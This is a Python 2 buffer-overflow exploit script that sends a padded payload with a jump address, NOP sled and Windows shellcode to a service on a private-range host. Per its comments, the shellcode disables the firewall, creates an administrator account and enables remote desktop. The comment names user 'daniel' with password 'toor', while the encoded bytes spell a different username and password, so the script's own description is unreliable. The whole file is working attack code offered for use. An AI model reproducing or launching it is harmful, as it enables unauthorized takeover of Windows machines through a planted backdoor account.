#!/usr/bin/env python2
import socket

target_host = "10.185.10.55"
target_port = 42424
jmp = "\xc3\x14\x04\x08"
nops = "\x90" * 15 

#  08-04-2020 DC: This idea came from https://www.exploit-db.com/exploits/48355 
## Description: Windows Shellcode that disables the Windows firewall, adds the user 'daniel' with password 'toor' to the system, adds the user 'daniel' to the local groups 'Administrators' & 'Remote Desktop Users', and then enables the RDP Service.

#  The shell code was generated with the following command:
#  msfvenom -p windows/exec CMD="'netsh firewall set opmode mode=DISABLE'&& 
# 'net user daniel toor /add'&& 
# 'net localgroup Administrators daniel /add'&& 
# 'net localgroup "Remote Desktop Users" daniel /add'&& 
# 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'" -f c -a x86  

shellcode = (
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x27\x6e\x65\x74\x73\x68\x20\x66\x69\x72\x65"
"\x77\x61\x6c\x6c\x20\x73\x65\x74\x20\x6f\x70\x6d\x6f\x64\x65"
"\x20\x6d\x6f\x64\x65\x3d\x44\x49\x53\x41\x42\x4c\x45\x27\x26"
"\x26\x27\x6e\x65\x74\x20\x75\x73\x65\x72\x20\x4d\x61\x6a\x69"
"\x6e\x42\x75\x75\x20\x54\x75\x72\x6e\x55\x32\x43\x40\x6e\x64"
"\x79\x63\x6c\x65\x61\x72\x20\x2f\x61\x64\x64\x27\x26\x26\x27"
"\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70\x20"
"\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73\x20"
"\x4d\x61\x6a\x69\x6e\x42\x75\x75\x20\x2f\x61\x64\x64\x27\x26"
"\x26\x27\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f\x75"
"\x70\x20\x22\x52\x65\x6d\x6f\x74\x65\x20\x44\x65\x73\x6b\x74"
"\x6f\x70\x20\x55\x73\x65\x72\x73\x22\x20\x4d\x61\x6a\x69\x6e"
"\x42\x75\x75\x20\x2f\x61\x64\x64\x27\x26\x26\x27\x72\x65\x67"
"\x20\x61\x64\x64\x20\x22\x48\x4b\x45\x59\x5f\x4c\x4f\x43\x41"
"\x4c\x5f\x4d\x41\x43\x48\x49\x4e\x45\x5c\x53\x59\x53\x54\x45"
"\x4d\x5c\x43\x75\x72\x72\x65\x6e\x74\x43\x6f\x6e\x74\x72\x6f"
"\x6c\x53\x65\x74\x5c\x43\x6f\x6e\x74\x72\x6f\x6c\x5c\x54\x65"
"\x72\x6d\x69\x6e\x61\x6c\x20\x53\x65\x72\x76\x65\x72\x22\x20"
"\x2f\x76\x20\x66\x44\x65\x6e\x79\x54\x53\x43\x6f\x6e\x6e\x65"
"\x63\x74\x69\x6f\x6e\x73\x20\x2f\x74\x20\x52\x45\x47\x5f\x44"
"\x57\x4f\x52\x44\x20\x2f\x64\x20\x30\x20\x2f\x66\x27\x00")


payload = "A" * 146 + jmp + nops + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_host, target_port))

s.send(payload + "\r\n")
s.close()
